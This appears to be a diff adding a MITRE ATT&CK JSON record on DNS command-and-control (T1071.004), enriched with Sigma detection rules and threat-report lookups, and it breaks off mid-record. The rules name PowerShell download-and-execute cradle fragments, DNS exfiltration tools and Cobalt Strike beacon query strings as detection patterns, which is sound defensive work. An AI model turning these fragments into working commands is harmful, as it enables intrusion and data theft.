@@ -1,0 +1,471 @@
+{
+    "id": "T1071.004",
+    "name": "DNS",
+    "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Command and Control",
+    "data_sources": "Network Traffic: Network Traffic Flow, Network Traffic: Network Traffic Content",
+    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\nMonitor for DNS traffic to/from known-bad or suspicious domains.",
+    "url": "https://attack.mitre.org/techniques/T1071/004",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1071.004",
+                "atomic_attack_guid": "e7bf9802-2e78-4db9-93b5-181b7bcd37d7",
+                "atomic_attack_name": "DNS C2",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
+                    "51186749-7415-46be-90e5-6914865c825a",
+                    "8ae51330-899c-4641-8125-e39f2e07da72",
+                    "c0580559-a6bd-4ef6-b9b7-83703d98b561",
+                    "ff3af8b5-2d14-40ec-9dd2-14e100011e51",
+                    "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
+                    "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
+                    "99138053-ae5d-4bcf-b2f8-0954edb204bc",
+                    "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                    "abfb5a93-e695-4ee9-bc10-541290bcd663",
+                    "36222790-0d43-4fe8-86e4-674b27809543",
+                    "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
+                    "98a96a5a-64a0-4c42-92c5-489da3866cb0",
+                    "0d18728b-f5bf-4381-9dcf-915539fff6c2",
+                    "3ceb2083-a27f-449a-be33-14ec1b7cc973",
+                    "2975af79-28c4-4d2f-a951-9095f229df29",
+                    "44ae5117-9c44-40cf-9c7c-7edad385ca70",
+                    "1996eef1-ced3-4d7f-bf94-33298cabbf72",
+                    "4153a907-2451-4e4f-a578-c52bb6881432",
+                    "b11d75d6-d7c1-11ea-87d0-0242ac130003",
+                    "53ba33fd-3a50-4468-a5ef-c583635cfa92",
+                    "f356a9c4-effd-4608-bbf8-408afd5cd006",
+                    "ce6e34ca-966d-41c9-8d93-5b06c8b97a06",
+                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
+                        "lookup_data": {
+                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_reg1\n  selection_reg1:\n    TargetObject|endswith:\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UMe\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UT\nfalsepositives:\n- Unknown\nid: 7bdf2a7c-3acc-4091-9581-0a77dad1c5b5\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - Registry\n",
+                            "sigma:id": "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
+                            "title": "Chafer Activity - Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "51186749-7415-46be-90e5-6914865c825a",
+                        "lookup_data": {
+                            "description": "High DNS requests amount from host per short period of time",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: High DNS requests amount from host per short period of time\ndetection:\n  condition: selection | count() by src_ip > 1000\n  selection:\n    dst_port: 53\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS requests rate to domain name which should be added to whitelist\nid: 51186749-7415-46be-90e5-6914865c825a\nlevel: medium\nlogsource:\n  category: firewall\nmodified: 2022/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High DNS Requests Rate - Firewall\n",
+                            "sigma:id": "51186749-7415-46be-90e5-6914865c825a",
+                            "title": "High DNS Requests Rate - Firewall",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8ae51330-899c-4641-8125-e39f2e07da72",
+                        "lookup_data": {
+                            "description": "Detects strings used in command execution in DNS TXT Answer",
+                            "raw": "author: Markus Neis\ndate: 2018/08/08\ndescription: Detects strings used in command execution in DNS TXT Answer\ndetection:\n  condition: selection\n  selection:\n    answer|contains:\n    - IEX\n    - Invoke-Expression\n    - cmd.exe\n    record_type: TXT\nfalsepositives:\n- Unknown\nid: 8ae51330-899c-4641-8125-e39f2e07da72\nlevel: high\nlogsource:\n  category: dns\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/stvemillertime/status/1024707932447854592\n- https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Backdoors/DNS_TXT_Pwnage.ps1\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.004\ntitle: DNS TXT Answer with Possible Execution Strings\n",
+                            "sigma:id": "8ae51330-899c-4641-8125-e39f2e07da72",
+                            "title": "DNS TXT Answer with Possible Execution Strings",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c0580559-a6bd-4ef6-b9b7-83703d98b561",
+                        "lookup_data": {
+                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_service\n  selection_service:\n    EventID: 4698\n    TaskName:\n    - SC Scheduled Scan\n    - UpdatMachine\nfalsepositives:\n- Unknown\nid: c0580559-a6bd-4ef6-b9b7-83703d98b561\nlevel: critical\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - Security\n",
+                            "sigma:id": "c0580559-a6bd-4ef6-b9b7-83703d98b561",
+                            "title": "Chafer Activity - Security",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ff3af8b5-2d14-40ec-9dd2-14e100011e51",
+                        "lookup_data": {
+                            "description": "APT34 targets Jordan Government using new Saitama backdoor",
+                            "link": "http://www.botvrij.eu/data/feed-osint/ff3af8b5-2d14-40ec-9dd2-14e100011e51.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1652457184",
+                            "uuid": "ff3af8b5-2d14-40ec-9dd2-14e100011e51",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
+                        "lookup_data": {
+                            "description": "High DNS requests amount from host per short period of time",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: High DNS requests amount from host per short period of time\ndetection:\n  condition: selection | count() by src_ip > 1000\n  selection:\n    query: '*'\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS requests rate to domain name which should be added to whitelist\nid: b4163085-4001-46a3-a79a-55d8bbbc7a3a\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2022/10/09\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High DNS Requests Rate\n",
+                            "sigma:id": "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
+                            "title": "High DNS Requests Rate",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
+                        "lookup_data": {
+                            "description": "Extremely high rate of TXT record type DNS requests from host per short period of time. Possible result of Do-exfiltration tool execution",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Extremely high rate of TXT record type DNS requests from host per short\n  period of time. Possible result of Do-exfiltration tool execution\ndetection:\n  condition: selection | count() by src_ip > 50\n  selection:\n    record_type: TXT\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS TXT requests rate to domain name which should be added to whitelist\nid: f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High TXT Records Requests Rate\n",
+                            "sigma:id": "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
+                            "title": "High TXT Records Requests Rate",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "99138053-ae5d-4bcf-b2f8-0954edb204bc",
+                        "lookup_data": {
+                            "description": "Scraper: Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor - SentinelOne",
+                            "link": "http://www.botvrij.eu/data/feed-osint/99138053-ae5d-4bcf-b2f8-0954edb204bc.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1667736035",
+                            "uuid": "99138053-ae5d-4bcf-b2f8-0954edb204bc",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                        "lookup_data": {
+                            "description": "Operation â€˜Harvestâ€™: A Deep Dive into a Long-term Campaign",
+                            "link": "http://www.botvrij.eu/data/feed-osint/c1bd5026-520b-45bd-9a79-82d38cf96c7b.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1633469315",
+                            "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "abfb5a93-e695-4ee9-bc10-541290bcd663",
+                        "lookup_data": {
+                            "description": "Aoqin Dragon | Newly-Discovered Chinese-linked APT Has Been Quietly Spying On Organizations For 10 Years",
+                            "link": "http://www.botvrij.eu/data/feed-osint/abfb5a93-e695-4ee9-bc10-541290bcd663.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1655839499",
+                            "uuid": "abfb5a93-e695-4ee9-bc10-541290bcd663",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "36222790-0d43-4fe8-86e4-674b27809543",
+                        "lookup_data": {
+                            "description": "Detecting DNS tunnel activity for Muddywater actor",
+                            "raw": "author: '@caliskanfurkan_'\ndate: 2020/06/04\ndescription: Detecting DNS tunnel activity for Muddywater actor\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: DataExchange.dll\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    ParentImage|endswith: \\excel.exe\nfalsepositives:\n- Unknown\nid: 36222790-0d43-4fe8-86e4-674b27809543\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://www.virustotal.com/gui/file/5ad401c3a568bd87dd13f8a9ddc4e450ece61cd9ce4d1b23f68ce0b1f3c190b7/\n- https://www.vmray.com/analyses/5ad401c3a568/report/overview.html\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.004\ntitle: DNS Tunnel Technique from MuddyWater\n",
+                            "sigma:id": "36222790-0d43-4fe8-86e4-674b27809543",
+                            "title": "DNS Tunnel Technique from MuddyWater",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
+                        "lookup_data": {
+                            "description": "Normally, DNS logs contain a limited amount of different dns queries for a single domain. This rule detects a high amount of queries for a single domain, which can be an indicator that DNS is used to transfer data.",
+                            "raw": "author: Patrick Bareiss\ndate: 2019/04/07\ndescription: Normally, DNS logs contain a limited amount of different dns queries\n  for a single domain. This rule detects a high amount of queries for a single domain,\n  which can be an indicator that DNS is used to transfer data.\ndetection:\n  condition: selection | count(dns_query) by parent_domain > 1000\n  selection:\n    parent_domain: '*'\nfalsepositives:\n- Valid software, which uses dns for transferring data\nid: 1ec4b281-aa65-46a2-bdae-5fd830ed914e\nlevel: high\nlogsource:\n  category: dns\nmodified: 2021/11/27\nreferences:\n- https://zeltser.com/c2-dns-tunneling/\n- https://patrick-bareiss.com/detect-c2-traffic-over-dns-using-sigma/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.004\n- attack.exfiltration\n- attack.t1048.003\ntitle: Possible DNS Tunneling\n",
+                            "sigma:id": "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
+                            "title": "Possible DNS Tunneling",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "98a96a5a-64a0-4c42-92c5-489da3866cb0",
+                        "lookup_data": {
+                            "description": "Well-known DNS Exfiltration tools execution",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Well-known DNS Exfiltration tools execution\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\iodine.exe\n  - Image|contains: \\dnscat2\nfalsepositives:\n- \"Legitimate usage of iodine or dnscat2 \\u2014 DNS Exfiltration tools (unlikely)\"\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.001\n- attack.command_and_control\n- attack.t1071.004\n- attack.t1132.001\ntitle: DNS Exfiltration and Tunneling Tools Execution\n",
+                            "sigma:id": "98a96a5a-64a0-4c42-92c5-489da3866cb0",
+                            "title": "DNS Exfiltration and Tunneling Tools Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0d18728b-f5bf-4381-9dcf-915539fff6c2",
+                        "lookup_data": {
+                            "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/16\ndescription: Detects a program that invoked suspicious DNS queries known from Cobalt\n  Strike beacons\ndetection:\n  condition: selection_eid and 1 of selection_query_*\n  selection_eid:\n    EventID: 3008\n  selection_query_1:\n    QueryName|startswith:\n    - aaa.stage.\n    - post.1\n  selection_query_2:\n    QueryName|contains: .stage.123456.\nfalsepositives:\n- Unknown\nid: 0d18728b-f5bf-4381-9dcf-915539fff6c2\nlevel: critical\nlogsource:\n  definition: 'Requirements: Microsoft-Windows-DNS Client Events/Operational Event\n    Log must be enabled/collected in order to receive the events.'\n  product: windows\n  service: dns-client\nreferences:\n- https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns\n- https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/\nrelated:\n- id: f356a9c4-effd-4608-bbf8-408afd5cd006\n  type: similar\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.004\ntitle: Suspicious Cobalt Strike DNS Beaconing - DNS Client\n",
+                            "sigma:id": "0d18728b-f5bf-4381-9dcf-915539fff6c2",
+                            "title": "Suspicious Cobalt Strike DNS Beaconing - DNS Client",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3ceb2083-a27f-449a-be33-14ec1b7cc973",
+                        "lookup_data": {
+                            "description": "Detects Silence EmpireDNSAgent as described in the Group-IP report",
+                            "raw": "author: Alina Stepchenkova, Group-IB, oscd.community\ndate: 2019/11/01\ndescription: Detects Silence EmpireDNSAgent as described in the Group-IP report\ndetection:\n  condition: empire and dnscat\n  dnscat:\n    ScriptBlockText|contains|all:\n    - set type=$LookupType`nserver\n    - $Command | nslookup 2>&1 | Out-String\n    - New-RandomDNSField\n    - '[Convert]::ToString($SYNOptions, 16)'\n    - $Session.Dead = $True\n    - $Session[\"Driver\"] -eq\n  empire:\n    ScriptBlockText|contains|all:\n    - System.Diagnostics.Process\n    - Stop-Computer\n    - Restart-Computer\n    - Exception in execution\n    - $cmdargs\n    - Close-Dnscat2Tunnel\nfalsepositives:\n- Unknown\nid: 3ceb2083-a27f-449a-be33-14ec1b7cc973\nlevel: critical\nlogsource:\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\n  service: powershell\nmodified: 2022/10/05\nreferences:\n- https://www.group-ib.com/resources/threat-research/silence_2.0.going_global.pdf\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1071.004\n- attack.t1572\n- attack.impact\n- attack.t1529\n- attack.g0091\n- attack.s0363\ntitle: Silence.EDA Detection\n",
+                            "sigma:id": "3ceb2083-a27f-449a-be33-14ec1b7cc973",
+                            "title": "Silence.EDA Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2975af79-28c4-4d2f-a951-9095f229df29",
+                        "lookup_data": {
+                            "description": "Detects suspicious DNS queries known from Cobalt Strike beacons",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/05/10\ndescription: Detects suspicious DNS queries known from Cobalt Strike beacons\ndetection:\n  condition: 1 of selection*\n  selection1:\n    query|startswith:\n    - aaa.stage.\n    - post.1\n  selection2:\n    query|contains: .stage.123456.\nfalsepositives:\n- Unknown\nid: 2975af79-28c4-4d2f-a951-9095f229df29\nlevel: critical\nlogsource:\n  category: dns\nmodified: 2022/10/09\nreferences:\n- https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns\n- https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.004\ntitle: Cobalt Strike DNS Beaconing\n",
+                            "sigma:id": "2975af79-28c4-4d2f-a951-9095f229df29",
+                            "title": "Cobalt Strike DNS Beaconing",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "44ae5117-9c44-40cf-9c7c-7edad385ca70",
+                        "lookup_data": {
+                            "description": "Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Extremely high rate of NULL record type DNS requests from host per short\n  period of time. Possible result of iodine tool execution\ndetection:\n  condition: selection | count() by src_ip > 50\n  selection:\n    record_type: 'NULL'\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS NULL requests rate to domain name which should be added to whitelist\nid: 44ae5117-9c44-40cf-9c7c-7edad385ca70\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High NULL Records Requests Rate\n",
+                            "sigma:id": "44ae5117-9c44-40cf-9c7c-7edad385ca70",
+                            "title": "High NULL Records Requests Rate",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1996eef1-ced3-4d7f-bf94-33298cabbf72",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1071.004",
+                            "mitre-cti:description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ",
+                            "mitre-cti:name": "DNS",
+                            "mitre-cti:type": "attack-pattern",
